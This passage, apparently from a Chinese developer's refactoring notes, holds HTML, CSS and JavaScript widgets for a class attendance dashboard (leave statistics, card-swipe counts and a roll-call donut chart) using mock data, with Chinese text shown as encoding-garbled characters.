            console.log('å½“å‰æ—¶é—´æ®µï¼šç‚¹åæ—¶é—´ï¼ˆ8:00-12:00ï¼‰');
        } else {
            // å…¶ä»–æ—¶é—´ï¼šé»˜è®¤æ— é«˜äº®æˆ–æ˜¾ç¤ºå·²å®ŒæˆçŠ¶æ€
            console.log('å½“å‰æ—¶é—´æ®µï¼šéæ´»åŠ¨æ—¶é—´');
        }
    }

    /**
     * ç»‘å®šäº‹ä»¶
     */
    function bindEvents() {
        // ä¸Šä¸€å¤©æŒ‰é’®
        document.getElementById('prevBtn').addEventListener('click', function() {
            console.log('ç‚¹å‡»ä¸Šä¸€å¤©');
            // TODO: å®ç°åˆ‡æ¢åˆ°ä¸Šä¸€å¤©çš„é€»è¾‘
            alert('åˆ‡æ¢åˆ°ä¸Šä¸€å¤©');
        });

        // ä¸‹ä¸€å¤©æŒ‰é’®
        document.getElementById('nextBtn').addEventListener('click', function() {
            console.log('ç‚¹å‡»ä¸‹ä¸€å¤©');
            // TODO: å®ç°åˆ‡æ¢åˆ°ä¸‹ä¸€å¤©çš„é€»è¾‘
            alert('åˆ‡æ¢åˆ°ä¸‹ä¸€å¤©');
        });

        // æµç¨‹èŠ‚ç‚¹ç‚¹å‡»äº‹ä»¶
        document.querySelectorAll('.step-item').forEach(item => {
            item.addEventListener('click', function() {
                const step = this.dataset.step;
                console.log('ç‚¹å‡»èŠ‚ç‚¹:', step);

                // TODO: å®ç°èŠ‚ç‚¹ç‚¹å‡»çš„å…·ä½“é€»è¾‘
                switch(step) {
                    case 'leave':
                        alert('æŸ¥çœ‹è¯·å‡è¯¦æƒ…');
                        break;
                    case 'card':
                        alert('æŸ¥çœ‹åˆ·å¡è¯¦æƒ…');
                        break;
                    case 'check':
                        alert('æŸ¥çœ‹ç‚¹åè¯¦æƒ…');
                        break;
                    case 'monthly':
                        alert('æŸ¥çœ‹æœˆæŠ¥è¡¨');
                        break;
                    case 'yearly':
                        alert('æŸ¥çœ‹å¹´æŠ¥è¡¨');
                        break;
                }
            });
        });
    }

    /**
     * æ ¼å¼åŒ–æ—¥æœŸ
     */
    function formatDate(date, format) {
        const year = date.getFullYear();
        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');

        return format
            .replace('yyyy', year)
            .replace('MM', month)
            .replace('dd', day);
    }
</script>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        width: 100vw;
        height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
        background: #fff;
        padding: 3.5vw;
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }

    /* ä¸»å¡ç‰‡æ ·å¼ */
    .main-card {
        background: linear-gradient(135deg, #26C281 0%, #1E9F6F 100%);
        border-radius: 2vw;
        padding: 1vw;
        margin-bottom: 5vh;
        color: white;
    }

    /* é¡¶éƒ¨å¯¼èˆª */
    .top-nav {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1vh;
    }

    .nav-item {
        display: flex;
        align-items: center;
        gap: 1.5vw;
        cursor: pointer;
        opacity: 0.9;
        transition: opacity 0.3s;
    }

    .nav-item:hover {
        opacity: 1;
    }

    .nav-arrow {
        width: 5vw;
        height: 5vw;
    }

    .nav-text {
        text-align: center;
    }

    .nav-count {
        font-size: 3vw;
        font-weight: 600;
        margin-bottom: 0.5vh;
    }

    .nav-label {
        font-size: 2.5vw;
        opacity: 0.9;
    }

    /* ä¸­å¿ƒåœ†å½¢ */
    .center-circle {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        width: 15vw;
        height: 15vw;
        border: 0.6vw solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        background: rgba(255, 255, 255, 0.1);
    }

    .circle-label {
        font-size: 1.5vw;
        margin-bottom: 1vh;
        opacity: 0.9;
    }

    .circle-percentage {
        font-size: 3vw;
        font-weight: bold;
        margin-bottom: 1vh;
    }

    .circle-date {
        font-size: 2vw;
        opacity: 0.9;
    }

    /* ç»Ÿè®¡è¡Œ */
    .stats-row {
        display: flex;
        justify-content: space-around;
        align-items: center;
    }

    .stat-item {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 1.5vh;
    }

    .stat-circle {
        width: 14vw;
        height: 14vw;
        border: 0.5vw solid rgba(255, 255, 255, 0.5);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(255, 255, 255, 0.1);
    }

    .stat-value {
        font-size: 6vw;
        font-weight: bold;
    }

    .stat-label {
        font-size: 3vw;
        opacity: 0.9;
    }

    /* æµç¨‹æ­¥éª¤ */
    .process-flow {
        display: flex;
        align-items: center;
        justify-content: space-evenly;
        padding: 0 2vw;
    }

    .step-item {
        display: flex;
        align-items: center;
        cursor: pointer;
        transition: all 0.3s;
    }

    .step-node {
        background: #7c5cef;
        color: white;
        padding: 2.3vh 2vw;
        border-radius: 1.5vw;
        font-size: 3.6vw;
        font-weight: 500;
        white-space: nowrap;
        transition: all 0.3s;
    }

    .step-item:hover .step-node {
        transform: scale(1.05);
        box-shadow: 0 0.5vh 2vh rgba(124, 92, 239, 0.3);
    }

    /* æ´»åŠ¨çŠ¶æ€ï¼ˆå‡¸èµ·æ•ˆæœï¼‰ */
    .step-item.active .step-node {
        background: linear-gradient(135deg, #9575ef 0%, #7c5cef 100%);
        box-shadow: 0 1vh 3vh rgba(0, 0, 10, 0.5);
        transform: translateY(-1vh) scale(1.1);
        animation: pulse 2s infinite;
    }

    @keyframes pulse {
        0%, 100% {
            box-shadow: 0 1vh 3vh rgba(110, 110, 110, 0.5);
        }
        50% {
            box-shadow: 0 1vh 4vh rgb(31, 31, 31);
        }
    }

    .step-arrow {
        width: 6vw;
        height: 6vw;
        color: #ef1717;
        display: flex;
    }

    .step-item:last-child .step-arrow {
        display: none;
    }

    /* å“åº”å¼è°ƒæ•´ */
    @media (min-width: 768px) {
        .nav-arrow {
            width: 2.5vw;
            height: 2.5vw;
        }

        .nav-count {
            font-size: 1.5vw;
        }

        .nav-label {
            font-size: 1.2vw;
        }

        .center-circle {
            width: 13vw;
            height: 13vw;
            border-width: 0.3vw;
        }

        .circle-label {
            font-size: 1.2vw;
        }

        .circle-percentage {
            font-size: 4vw;
        }

        .circle-date {
            font-size: 1.1vw;
        }

        .stat-circle {
            width: 7vw;
            height: 7vw;
            border-width: 0.25vw;
        }

        .stat-value {
            font-size: 3vw;
        }

        .stat-label {
            font-size: 1.5vw;
        }

        .step-node {
            padding: 1vh 2vw;
            border-radius: 1vw;
            font-size: 1.5vw;
        }

        .step-arrow {
            width: 2vw;
            height: 2vw;
        }

        .main-card {
            border-radius: 1vw;

        }
    }
</style>
</html>
```

### 2ã€é‡æ„è¯·å‡æ’ä»¶

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100%;
            height: 100%;
            overflow: auto;
            font-family: -apple-system, BlinkMacSystemFont, ''Segoe UI'', Roboto, sans-serif;
            background: #fff;
            font-size: 12px;
            line-height: 1.4;
            color: #333;
        }

        /* ä¸»å®¹å™¨ - å®Œå…¨å¡«æ»¡iframe */
        .iframe-content {
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            align-items: stretch;
            transform-origin: top left;
            overflow: auto;
            position: relative;
        }

        .container {
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            display: flex;
            flex-direction: column;
            overflow: auto;
        }

        .header {
            text-align: center;
            display: flex;
            padding: 15px 10px 10px 10px;
            border-bottom: 1px solid rgba(0,0,0,0.05);
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(10px);
        }

        .class-selector {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 8px;
        }

        .class-title {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin: 0;
            line-height: 1.3;
        }

        .total-count {
            font-size: 12px;
            color: #666;
            margin-top: 3px;
        }

        select {
            padding: 4px 8px;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            font-size: 11px;
            background: white;
            color: #333;
            outline: none;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        select:hover, select:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 2px rgba(102, 126, 234, 0.1);
        }

        .statistics-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            flex-wrap: wrap;
            padding: 10px;
            min-height: 0;
        }

        .time-card {
            background: linear-gradient(135deg, #a8e6cf 0%, #7fcdcd 100%);
            border-radius: 8px;
            width: 80px;
            padding: 12px 8px;
            text-align: center;
            min-width: 50px;
            flex: 0 0 auto;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
            animation: slideIn 0.6s ease-out;
        }

        .time-card:nth-child(3) {
            background: linear-gradient(135deg, #ffd3a5 0%, #fd9853 100%);
            animation-delay: 0.1s;
        }

        .time-card:nth-child(4) {
            background: linear-gradient(135deg, #a8e6cf 0%, #7fcdcd 100%);
            animation-delay: 0.2s;
        }

        .time-card:nth-child(5) {
            background: linear-gradient(135deg, #ffa8a8 0%, #ff7a7a 100%);
            animation-delay: 0.3s;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .time-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }

        .count {
            font-size: 16px;
            font-weight: bold;
            color: white;
            margin-bottom: 4px;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
            line-height: 1;
        }

        .time-label {
            font-size: 9px;
            color: rgba(255, 255, 255, 0.9);
            font-weight: 500;
            line-height: 1;
        }

        .center-circle {
            background: linear-gradient(135deg, #c8a8e9 0%, #b19cd9 100%);
            border-radius: 50%;
            width: 80px;
            height: 80px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
            transition: all 0.3s ease;
            animation: pulse 2s ease-in-out infinite alternate;
            flex: 0 0 auto;
        }

        @keyframes pulse {
            from {
                box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
            }
            to {
                box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            }
        }

        .center-circle:hover {
            transform: scale(1.05);
        }

        .center-count {
            font-size: 20px;
            font-weight: bold;
            color: white;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
            margin-bottom: 2px;
            line-height: 1;
        }

        .center-date {
            font-size: 8px;
            color: rgba(255, 255, 255, 0.9);
            font-weight: 500;
            line-height: 1;
        }

        .refresh-btn {
            position: absolute;
            bottom: 8px;
            right: 8px;
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 50%;
            color: white;
            font-size: 14px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(102, 126, 234, 0.3);
            transition: all 0.3s ease;
            z-index: 10;
        }

        .refresh-btn:hover {
            transform: rotate(180deg) scale(1.1);
            box-shadow: 0 6px 12px rgba(102, 126, 234, 0.4);
        }

        /* æ»šåŠ¨æ¡æ ·å¼ */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        ::-webkit-scrollbar-thumb {
            background: #c1c1c1;
            border-radius: 3px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #a8a8a8;
        }

        /* å“åº”å¼é€‚é… */
        @media (max-width: 300px) {
            .statistics-container {
                gap: 8px;
                padding: 8px;
            }

            .time-card {
                min-width: 40px;
                padding: 8px 4px;
            }

            .count {
                font-size: 14px;
            }

            .time-label {
                font-size: 8px;
            }

            .center-circle {
                width: 60px;
                height: 60px;
            }

            .center-count {
                font-size: 16px;
            }

            .center-date {
                font-size: 7px;
            }

            .class-title {
                font-size: 14px;
            }

            .total-count {
                font-size: 10px;
            }
        }

        @media (max-height: 200px) {
            .header {
                padding: 8px 10px 5px 10px;
            }

            .class-title {
                font-size: 14px;
            }

            .total-count {
                font-size: 10px;
            }

            .statistics-container {
                padding: 5px;
                gap: 8px;
            }

            .time-card {
                padding: 6px 4px;
            }

            .count {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
<div class="iframe-content">
    <div class="container">
        <div class="header">
            <h1 class="class-title" id="classTitle">ç™¾é¦™æœç­çº§</h1>
            <div class="total-count" id="totalCount">ï¼ˆå…±85äººï¼‰</div>
        </div>

        <div class="statistics-container">
            <div class="time-card">
                <div class="count" id="yesterdayCount">3</div>
                <div class="time-label">æ˜¨å¤©</div>
            </div>
            <div class="center-circle">
                <div class="center-count" id="todayCount">5</div>
                <div class="center-date" id="todayDate">ä»Š2025-08-05</div>
            </div>
            <div class="time-card">
                <div class="count" id="tomorrowCount">3</div>
                <div class="time-label">æ˜å¤©</div>
            </div>

            <div class="time-card">
                <div class="count" id="futureCount">3</div>
                <div class="time-label">æœªæ¥</div>
            </div>
        </div>
    </div>
</div>

<script>
    // æ¨¡æ‹Ÿç­çº§æ•°æ®
    var classData = {
        ''ç™¾é¦™æœç­çº§'': {
            total: 85,
            yesterday: 3,
            today: 5,
            tomorrow: 3,
            future: 3,
            date: ''2025-08-05''
        },
        ''è‹¹æœç­çº§'': {
            total: 72,
            yesterday: 4,
            today: 8,
            tomorrow: 2,
            future: 5,
            date: ''2025-08-05''
        },
        ''æ©™å­ç­çº§'': {
            total: 91,
            yesterday: 2,
            today: 6,
            tomorrow: 4,
            future: 2,
            date: ''2025-08-05''
        },
        ''è‘¡è„ç­çº§'': {
            total: 68,
            yesterday: 5,
            today: 3,
            tomorrow: 3,
            future: 4,
            date: ''2025-08-05''
        },
        ''è‰è“ç­çº§'': {
            total: 79,
            yesterday: 3,
            today: 7,
            tomorrow: 5,
            future: 1,
            date: ''2025-08-05''
        }
    };

    var objdata = {
        currentClass: ''ç™¾é¦™æœç­çº§''
    };

    // åˆå§‹åŒ–é¡µé¢
    function init() {
        updateDisplay();
        bindEvents();
    }

    // ç»‘å®šäº‹ä»¶
    function bindEvents() {
        var classSelector = document.getElementById(''classSelector'');
        var refreshBtn = document.getElementById(''refreshBtn'');

        if (classSelector) {
            classSelector.addEventListener(''change'', function() {
                objdata.currentClass = this.value;
                updateDisplay();
                animateUpdate();
            });
        }

        if (refreshBtn) {
            refreshBtn.addEventListener(''click'', function() {
                generateRandomData();
                updateDisplay();
                animateRefresh();
            });
        }
    }

    // æ›´æ–°æ˜¾ç¤ºæ•°æ®
    function updateDisplay() {
        var data = classData[objdata.currentClass];
        if (!data) return;

        var elements = {
            classTitle: document.getElementById(''classTitle''),
            totalCount: document.getElementById(''totalCount''),
            yesterdayCount: document.getElementById(''yesterdayCount''),
            todayCount: document.getElementById(''todayCount''),
            tomorrowCount: document.getElementById(''tomorrowCount''),
            tomorrowCount2: document.getElementById(''tomorrowCount2''),
            futureCount: document.getElementById(''futureCount''),
            todayDate: document.getElementById(''todayDate'')
        };

        if (elements.classTitle) elements.classTitle.textContent = objdata.currentClass;
        if (elements.totalCount) elements.totalCount.textContent = ''ï¼ˆå…±'' + data.total + ''äººï¼‰'';
        if (elements.yesterdayCount) elements.yesterdayCount.textContent = data.yesterday;
        if (elements.todayCount) elements.todayCount.textContent = data.today;
        if (elements.tomorrowCount) elements.tomorrowCount.textContent = data.tomorrow;
        if (elements.tomorrowCount2) elements.tomorrowCount2.textContent = data.tomorrow;
        if (elements.futureCount) elements.futureCount.textContent = data.future;
        if (elements.todayDate) elements.todayDate.textContent = ''ä»Š'' + data.date;
    }

    // ç”Ÿæˆéšæœºæ•°æ®
    function generateRandomData() {
        for (var className in classData) {
            if (classData.hasOwnProperty(className)) {
                classData[className] = {
                    total: Math.floor(Math.random() * 50) + 50,
                    yesterday: Math.floor(Math.random() * 8) + 1,
                    today: Math.floor(Math.random() * 10) + 1,
                    tomorrow: Math.floor(Math.random() * 8) + 1,
                    future: Math.floor(Math.random() * 8) + 1,
                    date: new Date().toISOString().split(''T'')[0]
                };
            }
        }
    }

    // åŠ¨ç”»æ•ˆæœ - æ›´æ–°
    function animateUpdate() {
        var cards = document.querySelectorAll(''.time-card, .center-circle'');
        cards.forEach(function(card, index) {
            card.style.animation = ''none'';
            setTimeout(function() {
                card.style.animation = ''slideIn 0.4s ease-out'';
                card.style.animationDelay = (index * 0.05) + ''s'';
            }, 20);
        });
    }

    // åŠ¨ç”»æ•ˆæœ - åˆ·æ–°
    function animateRefresh() {
        var container = document.querySelector(''.container'');
        if (container) {
            container.style.transform = ''scale(0.98)'';
            container.style.transition = ''transform 0.15s ease'';

            setTimeout(function() {
                container.style.transform = ''scale(1)'';
            }, 150);
        }
    }

    // é¡µé¢åŠ è½½å®Œæˆååˆå§‹åŒ–
    document.addEventListener(''DOMContentLoaded'', function() {
        init();

        // å®šæ—¶åˆ·æ–°æ—¥æœŸ
        setInterval(function() {
            var now = new Date();
            var dateStr = now.getFullYear() + ''-'' +
                String(now.getMonth() + 1).padStart(2, ''0'') + ''-'' +
                String(now.getDate()).padStart(2, ''0'');

            if (classData[objdata.currentClass]) {
                classData[objdata.currentClass].date = dateStr;
                var todayDateEl = document.getElementById(''todayDate'');
                if (todayDateEl) {
                    todayDateEl.textContent = ''ä»Š'' + dateStr;
                }
            }
        }, 60000);
    });

    // é”®ç›˜å¿«æ·é”®æ”¯æŒ
    document.addEventListener(''keydown'', function(e) {
        if (e.key === ''F5'' || (e.ctrlKey && e.key === ''r'')) {
            e.preventDefault();
            generateRandomData();
            updateDisplay();
            animateRefresh();
        }
    });

    // é˜²æ­¢iframeæ»šåŠ¨åˆ°çˆ¶é¡µé¢
    document.addEventListener(''wheel'', function(e) {
        var container = document.querySelector(''.iframe-content'');
        if (container) {
            var atTop = container.scrollTop <= 0;
            var atBottom = container.scrollTop >= container.scrollHeight - container.clientHeight;

            if ((atTop && e.deltaY < 0) || (atBottom && e.deltaY > 0)) {
                e.preventDefault();
            }
        }
    });
</script>
</body>
</html>
```

### 3ã€é‡æ„åˆ·å¡

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>å‡ºå‹¤å¡ç‰‡å±•ç¤º</title>
</head>
<body>

<!-- TODO æ”¾çš„å†…å®¹-->
<div class="date-display" id="dateDisplay">2025-08-05</div>

<div class="attendance-card">
    <div class="card-title" id="cardTitle">ç™¾é‘«æœç­çº§ï¼ˆå…±85äººï¼‰</div>
    
    <div class="stats-container">
        <div class="stat-item">
            <div class="stat-value" id="attendedCount">95äºº</div>
            <div class="stat-label">å·²åˆ°å¡</div>
        </div>
        
        <div class="stat-item">
            <div class="stat-value" id="attendanceRate">95%</div>
            <div class="stat-label">å±Šå¡ç‡</div>
        </div>
    </div>
</div>

<div class="footer-section">
    <div class="label">å¹¼å„¿å›­å¡</div>
    <button class="action-btn" id="actionBtn">è¿›è¡Œä¸­</button>
</div>

</body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const params = window.NODE_PARAMS || {};
        console.log('æ¥æ”¶åˆ°çš„å‚æ•°:', params);
        
        // æ ¹æ®å‚æ•°åŠ è½½æ•°æ®
        if (params.selected_time && params.time_granularity) {
            loadDataByTime(params.selected_time, params.time_granularity);
        } else {
            // æ²¡æœ‰å‚æ•°æ—¶ä½¿ç”¨é»˜è®¤æ•°æ®
            loadDefaultData();
        }
        
        // ç»‘å®šäº‹ä»¶
        bindEvents();
    });

    /**
     * æ ¹æ®æ—¶é—´åŠ è½½æ•°æ®
     * @param {string} selectedTime é€‰æ‹©çš„æ—¶é—´
     * @param {string} granularity æ—¶é—´ç»´åº¦ï¼ˆæ—¥ã€æœˆã€å¹´ï¼‰
     */
    function loadDataByTime(selectedTime, granularity) {
        console.log(`åŠ è½½æ•°æ®: æ—¶é—´=${selectedTime}, ç»´åº¦=${granularity}`);
        
        // æ›´æ–°æ—¥æœŸæ˜¾ç¤º
        updateDateDisplay(selectedTime, granularity);
        
        // TODO: è¿™é‡Œè°ƒç”¨åç«¯æ¥å£è·å–çœŸå®æ•°æ®
        // æ¨¡æ‹Ÿä»åç«¯è·å–çš„æ•°æ®
        const mockData = getMockDataByGranularity(granularity, selectedTime);
        
        // æ›´æ–°å¡ç‰‡æ˜¾ç¤º
        updateCard(mockData);
    }

    /**
     * åŠ è½½é»˜è®¤æ•°æ®
     */
    function loadDefaultData() {
        console.log('ä½¿ç”¨é»˜è®¤æ•°æ®');
        const today = new Date();
        const dateStr = formatDate(today, 'yyyy-MM-dd');
        
        document.getElementById('dateDisplay').textContent = dateStr;
        
        const defaultData = {
            className: 'ç™¾é¦™æœç­çº§',
            totalPeople: 85,
            attendedCount: 95,
            attendanceRate: 95,
            status: 'è¿›è¡Œä¸­'
        };
        
        updateCard(defaultData);
    }

    /**
     * æ ¹æ®æ—¶é—´ç²’åº¦è·å–æ¨¡æ‹Ÿæ•°æ®
     */
    function getMockDataByGranularity(granularity, selectedTime) {
        // TODO: å®é™…åº”è¯¥ä»åç«¯æ¥å£è·å–æ•°æ®
        return {
            className: 'ç™¾é‘«æœç­çº§',
            totalPeople: 85,
            attendedCount: Math.floor(Math.random() * 10) + 80,
            attendanceRate: Math.floor(Math.random() * 10) + 85,
            status: 'è¿›è¡Œä¸­'
        };
    }

    /**
     * æ›´æ–°æ—¥æœŸæ˜¾ç¤º
     */
    function updateDateDisplay(selectedTime, granularity) {
        const dateDisplay = document.getElementById('dateDisplay');
        
        if (granularity === 'å¹´') {
            const year = selectedTime.split('-')[0];
            dateDisplay.textContent = year;
        } else if (granularity === 'æœˆ') {
            const parts = selectedTime.split('-');
            dateDisplay.textContent = `${parts[0]}-${parts[1]}`;
        } else {
            // æ—¥æœŸæ ¼å¼ä¿æŒä¸å˜
            dateDisplay.textContent = selectedTime;
        }
    }

    /**
     * æ›´æ–°å¡ç‰‡æ•°æ®
     */
    function updateCard(data) {
        // æ›´æ–°æ ‡é¢˜
        document.getElementById('cardTitle').textContent = 
            `${data.className}ï¼ˆå…±${data.totalPeople}äººï¼‰`;
        
        // æ›´æ–°å·²åˆ°å¡äººæ•°
        document.getElementById('attendedCount').textContent = 
            `${data.attendedCount}äºº`;
        
        // æ›´æ–°åˆ°å¡ç‡
        document.getElementById('attendanceRate').textContent = 
            `${data.attendanceRate}%`;
        
        // æ›´æ–°æŒ‰é’®çŠ¶æ€
        const actionBtn = document.getElementById('actionBtn');
        actionBtn.textContent = data.status;
        
        // æ ¹æ®çŠ¶æ€æ”¹å˜æŒ‰é’®æ ·å¼
        if (data.status === 'å·²å®Œæˆ') {
            actionBtn.classList.add('completed');
            actionBtn.classList.remove('in-progress');
        } else {
            actionBtn.classList.add('in-progress');
            actionBtn.classList.remove('completed');
        }
    }

    /**
     * ç»‘å®šäº‹ä»¶
     */
    function bindEvents() {
        // æŒ‰é’®ç‚¹å‡»äº‹ä»¶
        document.getElementById('actionBtn').addEventListener('click', function() {
            const currentText = this.textContent;
            console.log('ç‚¹å‡»æŒ‰é’®:', currentText);
            
            // TODO: å®ç°å…·ä½“çš„ä¸šåŠ¡é€»è¾‘
            if (currentText === 'è¿›è¡Œä¸­') {
                alert('è€ƒå‹¤æ­£åœ¨è¿›è¡Œä¸­');
            } else if (currentText === 'å·²å®Œæˆ') {
                alert('è€ƒå‹¤å·²å®Œæˆ');
            }
        });
    }

    /**
     * æ ¼å¼åŒ–æ—¥æœŸ
     */
    function formatDate(date, format) {
        const year = date.getFullYear();
        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');

        return format
            .replace('yyyy', year)
            .replace('MM', month)
            .replace('dd', day);
    }
</script>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        width: 100vw;
        height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
        background: #fff;
        padding: 3.5vw;
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }

    /* å†…å®¹åŒºåŸŸæ ·å¼ */
    .date-display {
        font-size: 3vw;
        color: #999;
        margin-bottom: 2vh;
        font-weight: 400;
    }

    .attendance-card {
        background: #fff;
        border: 0.3vw solid #95de64;
        border-radius: 2vw;
        padding: 3vw 3.5vw;
        margin-bottom: 2vh;
    }

    .card-title {
        font-size: 3.2vw;
        color: #333;
        font-weight: 500;
        margin-bottom: 2vh;
    }

    .stats-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .stat-item {
        display: flex;
        flex-direction: column;
        align-items: center;
        flex: 1;
    }

    .stat-value {
        font-size: 4.5vw;
        color: #333;
        font-weight: 600;
        margin-bottom: 1vh;
    }

    .stat-label {
        font-size: 2.8vw;
        color: #666;
        font-weight: 400;
    }

    .footer-section {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: auto;
    }

    .label {
        font-size: 3.2vw;
        color: #333;
        font-weight: 500;
    }

    .action-btn {
        background: #ff4d4f;
        color: #fff;
        border: none;
        border-radius: 1.5vw;
        padding: 1.2vh 4vw;
        font-size: 3vw;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s;
    }

    .action-btn.in-progress {
        background: #ff4d4f;
    }

    .action-btn.completed {
        background: #52c41a;
    }

    .action-btn:hover {
        opacity: 0.85;
        transform: scale(0.98);
    }

    .action-btn:active {
        transform: scale(0.95);
    }

    /* å“åº”å¼è°ƒæ•´ */
    @media (min-width: 768px) {
        .date-display {
            font-size: 1.5vw;
        }

        .card-title {
            font-size: 1.6vw;
        }

        .stat-value {
            font-size: 2.2vw;
        }

        .stat-label {
            font-size: 1.4vw;
        }

        .label {
            font-size: 1.6vw;
        }

        .action-btn {
            font-size: 1.5vw;
            padding: 1vh 3vw;
        }

        .attendance-card {
            border-width: 0.15vw;
            border-radius: 1vw;
            padding: 2vw;
        }

        .action-btn {
            border-radius: 0.8vw;
        }
    }
</style>
</html>
```

### 4ã€é‡æ„ç‚¹åæ’ä»¶

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ç¯å½¢å›¾æ•°æ®å±•ç¤º</title>
</head>
<body>

<!-- TODO æ”¾çš„å†…å®¹-->
<div class="header" id="headerTitle">ç™¾é¦™æœé¡¹ç›®ï¼ˆ54äººï¼‰ï¼šåº”å‡ºå‹¤äººæ¬¡æ•° 150äººæ¬¡</div>

<div class="chart-container">
    <div class="donut-chart">
        <svg class="donut-svg" viewBox="0 0 120 120" preserveAspectRatio="xMidYMid meet">
            <!-- èƒŒæ™¯åœ†ç¯ -->
            <circle cx="60" cy="60" r="45" fill="none" stroke="#f0f0f0" stroke-width="18"/>
            
            <!-- æ©™è‰²éƒ¨åˆ† (å®é™…å‡ºå‹¤) -->
            <circle id="attendanceCircle" cx="60" cy="60" r="45" fill="none" stroke="#ffbb96" stroke-width="18"
                    stroke-dasharray="226 283" stroke-linecap="round"/>
            
            <!-- ç»¿è‰²éƒ¨åˆ† (ç¼ºå‹¤) -->
            <circle id="absenceCircle" cx="60" cy="60" r="45" fill="none" stroke="#95de64" stroke-width="18"
                    stroke-dasharray="127 382" stroke-dashoffset="-226" stroke-linecap="round"/>
        </svg>
        
        <div class="center-text" id="centerText">9æœˆ</div>
        
        <!-- å·¦ä¾§æ ‡ç­¾ -->
        <div class="label label-left">
            <span class="label-desc">ç¼ºå‹¤äººæ¬¡æ•°</span>
            <span class="label-value" id="absenceValue">43/45%</span>
        </div>
        
        <!-- å³ä¾§æ ‡ç­¾ -->
        <div class="label label-right">
            <span class="label-desc">å®é™…å‡ºå‹¤äººæ¬¡æ•°</span>
            <span class="label-value" id="attendanceValue">98/80%</span>
        </div>
    </div>
</div>

<div class="footer">
    <a href="javascript:void(0);" class="link" id="reportLink">
        <svg class="link-icon" viewBox="0 0 1024 1024" fill="currentColor">
            <path d="M832 128H640v64h146.752L521.344 457.344l45.312 45.312L832 237.248V384h64V128z"/>
            <path d="M768 832H192V256h352v-64H160a32 32 0 0 0-32 32v640a32 32 0 0 0 32 32h640a32 32 0 0 0 32-32V480h-64v352z"/>
        </svg>
        æœˆæŠ¥è¡¨
    </a>
    <button class="btn" id="actionBtn">å¾…æä½œ</button>
</div>

</body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const params = window.NODE_PARAMS || {};
        console.log('æ¥æ”¶åˆ°çš„å‚æ•°:', params);
        
        // æ ¹æ®å‚æ•°åŠ è½½æ•°æ®
        if (params.selected_time && params.time_granularity) {
            loadDataByTime(params.selected_time, params.time_granularity);
        } else {
            // æ²¡æœ‰å‚æ•°æ—¶ä½¿ç”¨é»˜è®¤æ•°æ®
            loadDefaultData();
        }
        
        // ç»‘å®šäº‹ä»¶
        bindEvents();
    });

    /**
     * æ ¹æ®æ—¶é—´åŠ è½½æ•°æ®
     * @param {string} selectedTime é€‰æ‹©çš„æ—¶é—´
     * @param {string} granularity æ—¶é—´ç»´åº¦ï¼ˆæ—¥ã€æœˆã€å¹´ï¼‰
     */
    function loadDataByTime(selectedTime, granularity) {
        console.log(`åŠ è½½æ•°æ®: æ—¶é—´=${selectedTime}, ç»´åº¦=${granularity}`);
        
        // TODO: è¿™é‡Œè°ƒç”¨åç«¯æ¥å£è·å–çœŸå®æ•°æ®
